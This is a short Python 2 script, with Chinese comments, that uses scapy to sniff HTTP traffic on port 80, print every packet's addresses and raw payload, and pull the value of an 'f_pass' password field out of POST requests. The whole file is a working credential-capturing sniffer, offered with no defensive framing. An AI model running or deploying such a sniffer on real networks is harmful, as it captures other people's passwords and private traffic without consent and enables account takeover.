#-*- coding:utf8 -*-

from scapy.all import *

# 定义数据包回调函数
def packet_callback(packet):
    str = packet.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}")
    print str
    if "POST" in str:
        n=str.find("f_pass")
        if n <> -1:
            strnew = str[n:]
            #print strnew
            m=strnew.find("&f")
            if m <> -1:
                #print m            
                strnewnew=str[n+21:n+m]            
                print "password encrypt is "+strnewnew

# 开启嗅探器
def sniffer_password1(pkcount):
    packets = sniff(filter="tcp and (port 80)", prn=packet_callback, count=pkcount)
    #wrpcap("easy.pcap",packets)
